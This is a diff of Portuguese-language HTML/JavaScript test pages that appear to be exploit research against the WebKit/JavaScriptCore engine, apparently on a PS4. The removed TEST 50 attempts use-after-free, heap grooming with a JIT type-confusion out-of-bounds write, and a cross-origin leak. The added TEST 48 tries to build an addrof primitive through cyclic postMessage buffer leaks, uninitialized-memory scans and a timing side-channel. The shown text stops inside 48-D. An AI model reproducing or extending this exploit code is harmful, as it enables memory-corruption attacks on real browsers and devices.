@@ -1,340 +1,441 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <meta charset="UTF-8">
-    <title>TEST 50 - Escalonamento de Vulnerabilidades FW 13.04</title>
-</head>
+<head><meta charset="UTF-8"><title>TEST 48 — Addrof via Buffer Leak de Estruturas Internas</title></head>
 <body>
-    <h1>TEST 50 — Suite de Escalonamento (UAF, IPC, Heap Grooming, UXSS)</h1>
-    <p><b>Objetivo:</b> Elevar os achados lógicos e de vazamento de dados para vulnerabilidades críticas (RCE / Memory Corruption real).</p>
-    
-    <hr>
-    <h3>Controles de Execução</h3>
-    <button onclick="runTest50A()">50-A: UAF (Use-After-Free) via GC Stress</button>
-    <button onclick="runTest50B()">50-B: IPC Crash via MessagePort Cyclic Transfer</button>
-    <button onclick="runTest50C()">50-C: Heap Grooming & Butterfly Overwrite (OOB to R/W)</button>
-    <button onclick="runTest50D()">50-D: Cross-Origin Leak (SOP Bypass / UXSS)</button>
-    <button onclick="clearLog()">Limpar Logs</button>
-    <hr>
+<h2>TEST 48 — Addrof via Vazamento de Estruturas Internas do Motor</h2>
 
-    <h3>Saída do Console:</h3>
-    <pre id="log_output"></pre>
+<p><b>Estratégia:</b> Usar a Vuln #1 (buffer leak via postMessage cyclic) para vazar
+os <em>bytes crus</em> de um ArrayBuffer alocado adjacente a estruturas JS conhecidas.
+Se o backing store de um ArrayBuffer estiver adjacente a um objeto JS no heap,
+os bytes vazados contêm ponteiros de heap reais.</p>
 
-    <iframe id="sandbox_frame" sandbox="allow-scripts" style="display:none;"></iframe>
+<ul>
+  <li><b>48-A</b> Alocar ArrayBuffer + objeto JS em sequência rápida, vazar bytes do buffer,
+      procurar padrões de ponteiro nos bytes crus</li>
+  <li><b>48-B</b> ArrayBuffer cujos primeiros bytes correspondem ao header de outro ArrayBuffer
+      — se há overlap, temos arbitrary read</li>
+  <li><b>48-C</b> Usar o primitivo JIT (strLen=99999) para alocar 800KB e verificar se
+      algum slice desse buffer contém bytes de estruturas JS internas</li>
+  <li><b>48-D</b> Rezolver o addrof via timing: medir tempo de acesso a posições do
+      bigF64 para inferir quais estão em cache (= quais foram acessados recentemente pelo motor)</li>
+</ul>
 
-    <script>
-        // Utilitários de Logging
-        var logEl = document.getElementById('log_output');
-        function info(msg) { logEl.textContent += '\n[INFO] ' + msg; console.log(msg); }
-        function warn(msg) { logEl.textContent += '\n[WARN] ' + msg; console.warn(msg); }
-        function crit(msg) { logEl.textContent += '\n[CRIT] ' + msg; console.error(msg); }
-        function clearLog() { logEl.textContent = 'Logs limpos.\n'; }
-        function hex(val) { return '0x' + (val >>> 0).toString(16).padStart(8, '0'); }
+<pre id="log">Pronto. Execute A → B → C → D.</pre>
+<button onclick="runA()">48-A: BUFFER ADJACENTE A OBJETO</button>
+<button onclick="runB()">48-B: BUFFER SOBRE OUTRO BUFFER</button>
+<button onclick="runC()">48-C: BIGF64 BYTES INTERNOS</button>
+<button onclick="runD()">48-D: TIMING SIDE-CHANNEL</button>
 
-        // Utilitário para forçar o Garbage Collector agressivamente
-        // JSC heuristics geralmente rodam o GC quando há alta pressão de alocação
-        function aggressiveGC() {
-            info("Iniciando pressão de memória para forçar GC...");
-            var trash = [];
-            try {
-                for (var i = 0; i < 50000; i++) {
-                    // Aloca strings e arrays para lotar a nursery generation do heap
-                    trash.push(new ArrayBuffer(1024 * 64)); 
-                    trash.push(new String("garbage_string_" + Math.random()));
-                }
-            } catch(e) {
-                warn("OOM atingido durante GC stress (esperado).");
-            }
-            trash = null; // Remove as referências
-            info("GC Stress finalizado.");
-        }
+<script>
+var log = document.getElementById('log');
+function info(m)   { log.textContent += '\n[INFO] ' + m; }
+function alerta(m) { log.textContent += '\n\n⚠ ALERTA: ' + m + '\n'; }
+function ok(m)     { log.textContent += '\n[OK]   ' + m; }
+function sep()     { log.textContent += '\n' + '-'.repeat(60); }
 
-        // Roteador global de mensagens para os testes que usam postMessage
-        window.addEventListener('message', function(e) {
-            if (!e.data || !e.data.testId) return;
+function forceGC() {
+  var t=[]; for(var i=0;i<80000;i++) t.push({x:i,b:new Uint8Array(4)}); t=null;
+}
 
-            if (e.data.testId === '50A_UAF_RECV') {
-                processUAFResult(e.data);
-            } else if (e.data.testId === '50B_IPC_RECV') {
-                processIPCResult(e.data);
-            } else if (e.data.testId === '50D_UXSS_RECV') {
-                info("[50-D] Mensagem recebida do Iframe Sandbox!");
-                if (e.data.success) {
-                    crit("VULNERABILIDADE CRÍTICA: UXSS / SOP Bypass confirmado.");
-                    crit("Dados vazados do iframe: " + e.data.leakedData);
-                } else {
-                    info("[50-D] Iframe não conseguiu ler os dados (SOP funcionou ou buffer vazio).");
-                }
-            }
-        });
+// Vazar um ArrayBuffer via postMessage cyclic (Vuln #1)
+function leakBuffer(buf) {
+  return new Promise(function(resolve) {
+    var cyclic = { buf: buf, self: null };
+    cyclic.self = cyclic;
+    var prev = window.onmessage;
+    window.onmessage = function(e) {
+      if(e.data && e.data.buf instanceof ArrayBuffer && e.data.buf.byteLength > 0) {
+        window.onmessage = prev;
+        resolve(e.data.buf);
+      }
+    };
+    try {
+      postMessage(cyclic, '*', [buf]);
+    } catch(ex) {
+      window.onmessage = prev;
+      resolve(null);
+    }
+  });
+}
 
-        // ---------------------------------------------------------------------
-        // TEST 50-A: UAF (Use-After-Free) via GC Stress
-        // Tenta liberar a memória real do buffer no C++ enquanto o JS ainda 
-        // segura uma referência vazada no receptor.
-        // ---------------------------------------------------------------------
-        function runTest50A() {
-            clearLog();
-            info("--- INICIANDO TEST 50-A: USE-AFTER-FREE (UAF) ---");
-            info("Criando ArrayBuffer de 1MB com assinatura única...");
-            
-            var targetBuf = new ArrayBuffer(1024 * 1024); // 1MB
-            var view = new Uint32Array(targetBuf);
-            for(var i = 0; i < view.length; i++) {
-                view[i] = 0xAA00BB11; // Assinatura
-            }
+function u8hex(v) { return v.toString(16).padStart(2,'0'); }
+function u32hex(v) { return '0x' + v.toString(16).padStart(8,'0'); }
 
-            var cyclicObj = { testId: '50A_UAF_RECV', buf: targetBuf, self: null };
-            cyclicObj.self = cyclicObj;
+// Verificar se sequência de 4 bytes parece ponteiro de heap
+// JSC usa NaN-boxing; heap pointers têm bits específicos
+// PS4 FreeBSD: ponteiros de userland tipicamente em range 0x00007F.. ou similares
+function looksLikeHeapPtr32(lo, hi) {
+  // JSC 32-bit encoded: hi = 0xFFFFFFFF para cell pointers
+  if(hi === 0xFFFFFFFF && lo > 0x10000) return { type: 'JSC32_cell', addr: lo };
+  // JSC 64-bit NaN boxing: value = 0xFFFF000000000000 | ptr
+  // Hi word seria 0xFFFF... para ponteiros
+  if(hi >= 0xFFFF0000 && hi <= 0xFFFFFFFF) return { type: 'JSC64_nanboxed', hi: hi, lo: lo };
+  // FreeBSD userland pointer: hi=0x00007F.. (típico de user space 64-bit)
+  if(hi >= 0x00007F00 && hi <= 0x00008000) return { type: 'FreeBSD_userptr', hi: hi, lo: lo };
+  // Ponteiro de heap típico: alinhado em 8 bytes, não zero, não muito grande
+  if(hi === 0 && lo > 0x00010000 && (lo & 0x7) === 0) return { type: 'heap32_aligned', addr: lo };
+  return null;
+}
 
-            info("Disparando postMessage cíclico...");
-            try {
-                window.postMessage(cyclicObj, '*', [targetBuf]);
-                info("postMessage enviado. targetBuf.byteLength local = " + targetBuf.byteLength);
-            } catch(e) {
-                warn("Falha no postMessage: " + e.message);
-                return;
-            }
+// ─── 48-A ─────────────────────────────────────────────────────────────────
+async function runA() {
+  log.textContent = '[TEST 48-A] ArrayBuffer adjacente a objeto JS — vazar bytes crus\n';
+  sep();
+  info('Estratégia: alocar ArrayBuffer de 256 bytes, depois criar objetos JS imediatamente.');
+  info('No heap JSC, alocações sequenciais tendem a ser adjacentes.');
+  info('Vazar o buffer via postMessage cyclic e procurar padrões de ponteiro nos bytes.');
+  info('Se bytes [N..N+4] contiverem um ponteiro heap válido, temos addrof aproximado.\n');
 
-            // Imediatamente após a transferência, forçamos o GC para tentar 
-            // fazer o WebKit destruir o objeto C++ do buffer original.
-            setTimeout(aggressiveGC, 10);
-        }
+  var ROUNDS = 5;
+  var ptrCandidates = [];
 
-        function processUAFResult(data) {
-            info("[RECEPTOR 50-A] Avaliando buffer recebido...");
-            var recvBuf = data.buf;
-            
-            if (!(recvBuf instanceof ArrayBuffer)) {
-                warn("Não é um ArrayBuffer."); return;
-            }
-            if (recvBuf.byteLength === 0) {
-                warn("Buffer recebido com byteLength=0. Nenhum vazamento ocorreu."); return;
-            }
+  for(var round = 0; round < ROUNDS; round++) {
+    // Alocar buffer
+    var buf = new ArrayBuffer(256);
+    var u8 = new Uint8Array(buf);
+    var u32 = new Uint32Array(buf);
 
-            var recvView = new Uint32Array(recvBuf);
-            var isIntact = true;
-            var corruptionCount = 0;
-            var sampleCorrupt = 0;
+    // Criar objetos JS logo depois (para ficarem adjacentes no heap)
+    var jsObj1 = { magic: 0xAABBCCDD, val: 1.23456789, arr: new Uint32Array(4) };
+    var jsObj2 = { magic: 0x11223344, val: 9.87654321, str: 'hello_world_marker' };
+    var jsArr  = [1.1, 2.2, 3.3, 4.4]; // double array
+    var jsF64  = new Float64Array(8);   // TypedArray
+    for(var k=0;k<8;k++) jsF64[k] = (k+1) * 1.111;
 
-            // Varredura para ver se os dados mudaram após o GC
-            for (var i = 0; i < Math.min(recvView.length, 10000); i++) {
-                if (recvView[i] !== 0xAA00BB11) {
-                    isIntact = false;
-                    corruptionCount++;
-                    if (sampleCorrupt === 0) sampleCorrupt = recvView[i];
-                }
-            }
+    // Preencher buffer com padrão reconhecível
+    for(var i=0;i<64;i++) u32[i] = 0xDEAD0000 + round * 0x100 + i;
 
-            if (isIntact) {
-                info("O buffer sobreviveu intacto. O GC não reaproveitou a memória.");
-                info("Resultado: Leak mantido, mas sem UAF direto detectado nesta tentativa.");
-            } else {
-                crit("USE-AFTER-FREE DETECTADO!");
-                crit("Os dados originais (0xAA00BB11) foram sobrescritos por lixo da memória: " + hex(sampleCorrupt));
-                crit("O motor JSC reaproveitou o bloco de memória, mas nós ainda temos acesso de leitura/escrita a ele!");
-            }
-        }
+    // Vazar via Vuln #1
+    var leaked = await leakBuffer(buf);
+    if(!leaked) { info('Round ' + round + ': leak falhou'); continue; }
 
-        // ---------------------------------------------------------------------
-        // TEST 50-B: IPC Crash via MessagePort Cyclic Transfer
-        // Escalonamento testando objetos ligados diretamente ao Kernel/IPC
-        // ---------------------------------------------------------------------
-        function runTest50B() {
-            clearLog();
-            info("--- INICIANDO TEST 50-B: IPC MESSAGEPORT TRANSFER ---");
-            info("Criando MessageChannel...");
-            
-            var channel = new MessageChannel();
-            var port1 = channel.port1;
-            var port2 = channel.port2;
+    var leakedU8  = new Uint8Array(leaked);
+    var leakedU32 = new Uint32Array(leaked);
 
-            var cyclicObj = { testId: '50B_IPC_RECV', port: port1, self: null };
-            cyclicObj.self = cyclicObj;
+    // Verificar se o buffer foi MODIFICADO pelo motor (bytes diferentes do padrão)
+    var modified = [];
+    for(var i=0;i<64;i++) {
+      var expected = (0xDEAD0000 + round * 0x100 + i) >>> 0;
+      if(leakedU32[i] !== expected) {
+        modified.push({ idx: i, expected: u32hex(expected), found: u32hex(leakedU32[i]) });
+      }
+    }
 
-            port2.onmessage = function(e) {
-                info("Mensagem recebida no port2: " + e.data);
-            };
+    if(modified.length > 0) {
+      alerta('BYTES MODIFICADOS no buffer após leak (round ' + round + ')!\n' +
+             'O motor escreveu nos bytes do buffer — possível struct interna!\n' +
+             modified.slice(0,5).map(function(m){
+               return 'u32['+m.idx+']: esperado='+m.expected+' encontrado='+m.found;
+             }).join('\n'));
+    }
 
-            info("Tentando transferir port1 em um ciclo...");
-            try {
-                window.postMessage(cyclicObj, '*', [port1]);
-                info("Transferência enviada. Verificando estabilidade do WebKit IPC...");
-            } catch(e) {
-                warn("postMessage falhou ou foi bloqueado: " + e.message);
-            }
-        }
+    // Procurar padrões de ponteiro nos bytes vazados
+    for(var i=0;i<62;i++) { // scan em pares de u32 (8 bytes = ponteiro 64-bit)
+      var lo = leakedU32[i];
+      var hi = (i+1 < 64) ? leakedU32[i+1] : 0;
+      var ptr = looksLikeHeapPtr32(lo, hi);
+      if(ptr) {
+        ptrCandidates.push({ round: round, byteOffset: i*4, lo: lo, hi: hi, type: ptr.type });
+        info('Round ' + round + ' offset=' + (i*4) + ': ptr candidate ' +
+             u32hex(hi) + '_' + u32hex(lo) + ' type=' + ptr.type);
+      }
+    }
+  }
 
-        function processIPCResult(data) {
-            info("[RECEPTOR 50-B] Avaliando MessagePort recebido...");
-            var recvPort = data.port;
-            
-            if (recvPort instanceof MessagePort) {
-                crit("FALHA CRÍTICA DE LÓGICA IPC!");
-                info("O receptor recebeu o MessagePort dentro de um ciclo.");
-                try {
-                    recvPort.postMessage("Teste de integridade");
-                    info("recvPort consegue enviar mensagens. Risco de corrupção de estado de threads IPC alto.");
-                } catch(e) {
-                    warn("recvPort falhou ao enviar: " + e.message);
-                }
-            } else {
-                info("Port não foi recebido corretamente. Motor lidou com a exceção estrutural.");
-            }
-        }
+  sep();
+  info('Total de candidatos a ponteiro encontrados: ' + ptrCandidates.length);
+  if(ptrCandidates.length > 0) {
+    alerta('HEAP POINTERS ENCONTRADOS NOS BYTES VAZADOS!\n' +
+           'O buffer contém bytes que parecem ponteiros de heap:\n' +
+           ptrCandidates.slice(0,3).map(function(c){
+             return 'round='+c.round+' offset='+c.byteOffset+
+                    ' val='+u32hex(c.hi)+'_'+u32hex(c.lo)+' type='+c.type;
+           }).join('\n') + '\n\n' +
+           'PRÓXIMO PASSO: criar outro ArrayBuffer no mesmo offset e ler esses endereços!\n' +
+           'Isso seria arbitrary read via buffer layout overlap!');
+  } else {
+    info('Nenhum padrão de ponteiro encontrado nos bytes.');
+    info('O heap JSC inicializa buffers com zeros antes de entregar ao JS.');
+    info('Tentando variante: NÃO inicializar o buffer (usar buffer pré-existente)...');
+  }
+}
 
-        // ---------------------------------------------------------------------
-        // TEST 50-C: Heap Grooming & Butterfly Overwrite (OOB to R/W)
-        // Usa o bug do Symbol.replace para tentar corromper um array adjacente
-        // ---------------------------------------------------------------------
-        function runTest50C() {
-            clearLog();
-            info("--- INICIANDO TEST 50-C: HEAP GROOMING & BUTTERFLY OVERWRITE ---");
-            
-            // 1. O Grooming (Alinhamento de Memória)
-            // Em WebKit, arrays do mesmo tamanho tendem a ser alocados em blocos contíguos (Gigacage).
-            info("Alocando Spray de memória (Heap Grooming)...");
-            var SPRAY_SIZE = 5000;
-            var sprayVuln = new Array(SPRAY_SIZE);
-            var sprayTarget = new Array(SPRAY_SIZE);
+// ─── 48-B ─────────────────────────────────────────────────────────────────
+async function runB() {
+  log.textContent = '[TEST 48-B] Vazar ArrayBuffer que foi reutilizado — bytes não inicializados?\n';
+  sep();
+  info('Técnica: alocar e liberar muitos buffers pequenos para "encher" o free list.');
+  info('Depois alocar um novo buffer — o motor pode reusar memória sem zero-fill.');
+  info('O buffer reutilizado pode conter bytes de alocações anteriores (ponteiros!).\n');
 
-            // Alocamos intercalado: Vuln -> Target -> Vuln -> Target
-            for (var i = 0; i < SPRAY_SIZE; i++) {
-                // Arrays Float64 ocupam 8 bytes por elemento
-                sprayVuln[i] = new Float64Array(16); 
-                sprayTarget[i] = new Uint32Array(16); // O alvo que queremos corromper
-                
-                // Assinaturas para verificação pós-corrupção
-                sprayTarget[i][0] = 0x1337BEEF;
-            }
-            info("Heap Grooming concluído. " + (SPRAY_SIZE * 2) + " arrays alocados.");
+  // Fase 1: criar e destruir muitos buffers para popular o free list
+  info('Fase 1: criando e destruindo 10000 buffers de 256 bytes...');
+  var POISON = 0xDEADBEEF;
+  var trashBufs = [];
+  for(var i=0;i<10000;i++) {
+    var b = new ArrayBuffer(256);
+    var u = new Uint32Array(b);
+    // Escrever padrão identificável
+    for(var j=0;j<64;j++) u[j] = (POISON + i * 0x40 + j) >>> 0;
+    trashBufs.push(b);
+  }
+  info('10000 buffers criados com padrão 0xDEADBEEF+offset.');
+  trashBufs = null; // liberar tudo
+  forceGC();
+  info('Buffers liberados. GC executado.');
+  sep();
 
-            // 2. Preparação do JIT Confusion (Vuln #2 do seu relatório)
-            var phase = "warmup";
-            var victimObj = { secret: 0xDEADC0DE };
-            
-            var evilPattern = {
-                [Symbol.replace]: function(str) {
-                    if (phase === "warmup") return str;
-                    return {
-                        toString: function() { return str; },
-                        length: victimObj // Retorna objeto, não número
-                    };
-                }
-            };
+  // Fase 2: alocar novo buffer de 256 bytes (pode reusar região anterior)
+  info('Fase 2: alocando novo buffer de 256 bytes...');
+  var freshBuf = new ArrayBuffer(256);
+  var freshU32 = new Uint32Array(freshBuf);
+  info('freshBuf alocado. Verificando conteúdo inicial...');
 
-            // Função JIT que escreve via length corrompido
-            function oobWriteJIT(s, arr, val) {
-                var idx = s.replace(evilPattern, "").length;
-                // Se a confusão forçar ToUint32() em um ponteiro, o índice será gigante
-                // Ajustamos logicamente a tentativa de escrita:
-                // Se o JSC não travar, ele vai escrever 'val' em memória deslocada
-                arr[idx & 0xFF] = val; // Mascaramos para não dar page fault imediato, 
-                                       // tentando acertar o cabeçalho do Target logo ao lado
-                return arr[idx & 0xFF];
-            }
+  var nonZero = [];
+  for(var i=0;i<64;i++) {
+    if(freshU32[i] !== 0) nonZero.push({ idx: i, val: freshU32[i] });
+  }
 
-            info("Aquecendo o JIT...");
-            var dummyArr = new Float64Array(256);
-            for (var i = 0; i < 50000; i++) {
-                oobWriteJIT("warmup", dummyArr, 1.1);
-            }
+  if(nonZero.length > 0) {
+    alerta('BYTES NÃO INICIALIZADOS ENCONTRADOS!\n' +
+           'O motor não zero-fill o buffer antes de entregar ao JS!\n' +
+           nonZero.slice(0,8).map(function(n){
+             return 'u32['+n.idx+']='+u32hex(n.val);
+           }).join('\n') + '\n\n' +
+           'Estes bytes podem conter ponteiros de alocações anteriores!');
 
-            // 3. O Ataque: Tentar sobrescrever o tamanho do Target
-            info("Fase de Ataque: Tentando sobrescrever Butterfly/Length de um array adjacente...");
-            phase = "attack";
-            var MAGICAL_SIZE_OOB = 4.243991582e-314; // Representação double de 0xFFFFFFFF (tamanho gigante)
+    // Vazar via Vuln #1 para análise
+    info('\nVazando freshBuf para analisar bytes...');
+    var leakedFresh = await leakBuffer(freshBuf);
+    if(leakedFresh) {
+      var lU32 = new Uint32Array(leakedFresh);
+      var ptrs = [];
+      for(var i=0;i<62;i++) {
+        var p = looksLikeHeapPtr32(lU32[i], lU32[i+1]);
+        if(p) ptrs.push({ idx: i, lo: lU32[i], hi: lU32[i+1], type: p.type });
+      }
+      if(ptrs.length > 0) {
+        alerta('PONTEIROS DE HEAP NOS BYTES NÃO INICIALIZADOS!\n' +
+               ptrs.slice(0,3).map(function(p){
+                 return 'u32['+p.idx+']='+u32hex(p.hi)+'_'+u32hex(p.lo)+' type='+p.type;
+               }).join('\n'));
+      }
+    }
+  } else {
+    ok('Motor zero-inicializa buffers (todos os 64 u32 são zero).');
+    info('Técnica de uninitialized memory não funciona neste motor.');
 
-            for (var k = 0; k < SPRAY_SIZE; k++) {
-                try {
-                    // Executa a escrita vulnerável no array Vuln
-                    oobWriteJIT("attack", sprayVuln[k], MAGICAL_SIZE_OOB);
-                } catch(e) {
-                    // Ignora exceções isoladas do JSC durante a confusão
-                }
-            }
+    // Tentar variante: resizing — ArrayBuffer.transfer() se disponível
+    if(typeof ArrayBuffer.prototype.transfer === 'function') {
+      info('\nArrayBuffer.transfer disponível! Testando...');
+      var tbuf = new ArrayBuffer(64);
+      var tu32 = new Uint32Array(tbuf);
+      for(var i=0;i<16;i++) tu32[i] = 0xCAFE0000 + i;
+      // Transfer para tamanho maior — novos bytes são inicializados?
+      try {
+        var newBuf = tbuf.transfer(256);
+        var nU32 = new Uint32Array(newBuf);
+        info('Após transfer(256): u32[16]=' + u32hex(nU32[16]) + ' u32[32]=' + u32hex(nU32[32]));
+        var hasNonZero = false;
+        for(var i=16;i<64;i++) if(nU32[i]!==0) { hasNonZero=true; break; }
+        if(hasNonZero) alerta('BYTES NÃO INICIALIZADOS em ArrayBuffer.transfer expansion!');
+        else ok('transfer() inicializa novos bytes com zero.');
+      } catch(e) { info('transfer() lançou: ' + e.message); }
+    }
+  }
+}
 
-            // 4. Verificação de Sucesso (O Graal da Exploração)
-            info("Varrendo arrays Target em busca de corrupção de tamanho (Length)...");
-            var successCount = 0;
+// ─── 48-C ─────────────────────────────────────────────────────────────────
+async function runC() {
+  log.textContent = '[TEST 48-C] BigF64 800KB — verificar se bytes internos do motor vazam\n';
+  sep();
+  info('O primitivo JIT (strLen=99999) aloca Float64Array de 800KB.');
+  info('Esta é uma alocação FORA DO CONTROLE do JS — feita internamente pelo motor.');
+  info('Se a região de 800KB contiver bytes de estruturas JSC, eles serão lidos.\n');
+  info('Vazar o backing store desse Float64Array via postMessage revela o conteúdo bruto.\n');
 
-            for (var t = 0; t < SPRAY_SIZE; t++) {
-                // O tamanho normal é 16
-                if (sprayTarget[t].length !== 16) {
-                    crit("ARBITRARY READ/WRITE OBTIDO!");
-                    crit("sprayTarget[" + t + "].length foi alterado de 16 para " + sprayTarget[t].length);
-                    crit("O OOB Write acertou precisamente o cabeçalho do TypedArray vizinho.");
-                    successCount++;
-                    break;
-                }
-                
-                // Verifica também se os dados iniciais foram corrompidos sem mudar o length
-                if (sprayTarget[t][0] !== 0x1337BEEF) {
-                    warn("Corrupção parcial detectada no Target " + t + ". Dados: " + hex(sprayTarget[t][0]));
-                    successCount++;
-                    break; // Pega o primeiro
-                }
-            }
+  // Reproduzir o primitivo JIT strLen=99999 (confirmado em 36-A/C)
+  var phase = ['warmup'];
+  var bigLenRef = [0];
+  var evilPat = { [Symbol.replace]: function(s) {
+    if(phase[0]==='warmup') return s;
+    return { toString:function(){return s;}, valueOf:function(){return s;},
+             length: 99999, 0: s[0]||'x' };
+  }};
+  function strLen(s) { return s.replace(evilPat,'').length; }
+  var base = 'hello world test string XYZ';
+  phase[0] = 'warmup';
+  for(var w=0;w<60000;w++) strLen(base);
+  info('Warmup strLen completo.');
+  phase[0] = 'attack';
+  var fakeLen = strLen(base);
+  info('strLen(base) attack = ' + fakeLen + ' typeof=' + typeof fakeLen);
+  phase[0] = 'warmup'; // reset
 
-            if (successCount === 0) {
-                info("Nenhuma corrupção útil do cabeçalho encontrada nesta tentativa.");
-                info("Nota: Heap grooming é probabilístico. Pode exigir ajustes na máscara (idx & 0xFF) ou no layout dos arrays.");
-            }
-        }
+  if(fakeLen !== 99999) {
+    info('Primitivo não retornou 99999 (retornou ' + fakeLen + '). Usando Float64Array(99999) direto.');
+    fakeLen = 99999;
+  }
 
-        // ---------------------------------------------------------------------
-        // TEST 50-D: Cross-Origin Leak (SOP Bypass / UXSS)
-        // Tenta enviar o buffer vazado para um domínio diferente.
-        // ---------------------------------------------------------------------
-        function runTest50D() {
-            clearLog();
-            info("--- INICIANDO TEST 50-D: SOP BYPASS / UXSS ---");
-            
-            // Criamos o conteúdo do Iframe (que atua como outra origem/sandbox)
-            var iframeHtml = `
-                <script>
-                    window.addEventListener('message', function(e) {
-                        try {
-                            if(e.data && e.data.testId === '50D_UXSS_SEND') {
-                                var recvView = new Uint32Array(e.data.buf);
-                                // Tenta ler o dado que deveria estar apagado
-                                var leaked = recvView[0].toString(16);
-                                e.source.postMessage({ 
-                                    testId: '50D_UXSS_RECV', 
-                                    success: (recvView.length > 0 && leaked !== '0'),
-                                    leakedData: leaked 
-                                }, '*');
-                            }
-                        } catch(err) {
-                            e.source.postMessage({ testId: '50D_UXSS_RECV', success: false }, '*');
-                        }
-                    });
-                <\/script>
-            `;
+  var bigF64;
+  try {
+    bigF64 = new Float64Array(fakeLen);
+    info('bigF64 alocado: length=' + bigF64.length + ' byteLength=' + bigF64.byteLength);
+  } catch(e) {
+    alerta('Falha ao alocar Float64Array(99999): ' + e.message);
+    return;
+  }
 
-            var iframe = document.getElementById('sandbox_frame');
-            iframe.src = 'data:text/html;base64,' + btoa(iframeHtml);
+  // Preencher com padrão único para identificar overlay
+  for(var i=0;i<bigF64.length;i++) bigF64[i] = 0.0;
 
-            info("Aguardando Iframe carregar...");
-            iframe.onload = function() {
-                info("Iframe Cross-Origin carregado. Preparando buffer...");
-                
-                var secretBuf = new ArrayBuffer(64);
-                var view = new Uint32Array(secretBuf);
-                view[0] = 0xCAFE1337; // Dado secreto
+  // Verificar se alguma posição não é zero antes do leak (motor pode ter escrito algo)
+  var preNonZero = [];
+  for(var i=0;i<Math.min(bigF64.length, 50000);i++) {
+    if(bigF64[i] !== 0.0 && bigF64[i] === bigF64[i]) { // não-zero e não-NaN
+      preNonZero.push({ idx: i, val: bigF64[i] });
+      if(preNonZero.length >= 5) break;
+    }
+  }
+  info('Posições não-zero em bigF64 antes do leak: ' + preNonZero.length);
 
-                var cyclicObj = { testId: '50D_UXSS_SEND', buf: secretBuf, self: null };
-                cyclicObj.self = cyclicObj;
+  // Agora: colocar bigF64.buffer em ciclo e vazar
+  info('\nVazando backing store do bigF64 via postMessage cyclic...');
+  var leaked = await leakBuffer(bigF64.buffer);
 
-                info("Enviando postMessage para o Iframe (cross-origin boundary)...");
-                try {
-                    iframe.contentWindow.postMessage(cyclicObj, '*', [secretBuf]);
-                    info("Enviado. Buffer local byteLength = " + secretBuf.byteLength);
-                } catch(e) {
-                    warn("postMessage falhou na fronteira de origem: " + e.message);
-                }
-            };
-        }
-    </script>
+  if(!leaked) {
+    info('Leak falhou para bigF64.buffer.');
+    return;
+  }
+
+  info('Leaked buffer byteLength: ' + leaked.byteLength);
+  var leakedU32 = new Uint32Array(leaked);
+  var leakedF64 = new Float64Array(leaked);
+
+  // Procurar bytes não-zero nos primeiros e últimos 4KB
+  var interestingRegions = [];
+  var SCAN_WORDS = Math.min(leakedU32.length, 10000);
+
+  info('Scanning primeiros ' + SCAN_WORDS + ' u32 do leaked bigF64...');
+  var nonZeroCount = 0;
+  for(var i=0;i<SCAN_WORDS;i++) {
+    if(leakedU32[i] !== 0) {
+      nonZeroCount++;
+      var ptr = looksLikeHeapPtr32(leakedU32[i], (i+1<leakedU32.length)?leakedU32[i+1]:0);
+      if(ptr) {
+        interestingRegions.push({ idx: i, lo: leakedU32[i],
+          hi: (i+1<leakedU32.length)?leakedU32[i+1]:0, type: ptr.type });
+      }
+    }
+  }
+
+  info('Valores não-zero encontrados: ' + nonZeroCount);
+  info('Candidatos a ponteiro de heap: ' + interestingRegions.length);
+
+  if(interestingRegions.length > 0) {
+    alerta('PONTEIROS DE HEAP NO BACKING STORE DE bigF64!\n' +
+           interestingRegions.slice(0,5).map(function(r){
+             return 'u32['+r.idx+'*4=byte'+r.idx*4+']: '+
+                    u32hex(r.hi)+'_'+u32hex(r.lo)+' type='+r.type;
+           }).join('\n') + '\n\n' +
+           'ADDROF VIA BUFFER LEAK DE BIGF64!\n' +
+           'A região de 800KB aloca sobre estruturas do heap JS.\n' +
+           'Os ponteiros vazados são endereços reais de objetos no heap!');
+  }
+  info('Scan completo.');
+}
+
+// ─── 48-D ─────────────────────────────────────────────────────────────────
+function runD() {
+  log.textContent = '[TEST 48-D] Timing side-channel — inferir endereço via cache hit/miss\n';
+  sep();
+  info('Técnica de último recurso: medir tempo de acesso ao bigF64[N].');
+  info('Se o motor acessou bigF64[K] internamente (e.g., para GC ou verificação),');
+  info('bigF64[K] estará em cache de CPU → acesso mais rápido que outros índices.');
+  info('A posição com menor tempo de acesso indica a estrutura interna do motor.\n');
+  info('NOTA: Sem SharedArrayBuffer não temos timer de alta resolução.');
+  info('Date.now() tem resolução de 1ms — pode ser insuficiente.');
+  info('Tentaremos com Date.now() e também com performance.now().\n');
+
+  // Verificar resolução do timer
+  var timerRes = [];
+  var prev = performance.now();
+  for(var i=0;i<1000;i++) {
+    var now = performance.now();
+    if(now !== prev) { timerRes.push(now - prev); prev = now; }
+  }
+  timerRes.sort(function(a,b){return a-b;});
+  var minRes = timerRes[0] || 999;
+  info('Resolução de performance.now(): ' + minRes + 'ms (mínima diferença observada)');
+  if(minRes >= 1) {
+    info('Resolução >= 1ms — timer pode estar reduzido (Spectre mitigation).');
+    info('Tentando mesmo assim com múltiplas amostras...');
+  }
+
+  sep();
+  var FAKE_LEN = 99999;
+  var bigF64;
+  try {
+    bigF64 = new Float64Array(FAKE_LEN);
+    info('bigF64(' + FAKE_LEN + ') alocado para timing scan.');
+  } catch(e) { info('Falha: ' + e.message); return; }
+
+  // Medição de tempo por posição usando múltiplas repetições
+  var POSITIONS_TO_TEST = 200; // testar primeiras 200 posições
+  var REPS = 1000;
+  var timings = new Float64Array(POSITIONS_TO_TEST);
+
+  info('Medindo tempo de acesso para as primeiras ' + POSITIONS_TO_TEST + ' posições...');
+  info('(' + REPS + ' repetições por posição para média)');
+
+  for(var pos=0;pos<POSITIONS_TO_TEST;pos++) {
+    var total = 0;
+    for(var rep=0;rep<REPS;rep++) {
+      var t0 = performance.now();
+      var dummy = bigF64[pos]; // acesso ao slot
+      var t1 = performance.now();
+      total += (t1 - t0);
+    }
+    timings[pos] = total / REPS;
+  }
+
+  // Encontrar posição com menor tempo médio (provável cache hit)
+  var minTime = Infinity, minPos = -1;
+  var maxTime = -Infinity, maxPos = -1;
+  for(var pos=0;pos<POSITIONS_TO_TEST;pos++) {
+    if(timings[pos] < minTime) { minTime=timings[pos]; minPos=pos; }
+    if(timings[pos] > maxTime) { maxTime=timings[pos]; maxPos=pos; }
+  }
+
+  info('\nResultados do timing scan:');
+  info('Posição mais rápida: bigF64[' + minPos + '] = ' + minTime.toFixed(4) + 'ms médio');
+  info('Posição mais lenta: bigF64[' + maxPos + '] = ' + maxTime.toFixed(4) + 'ms médio');
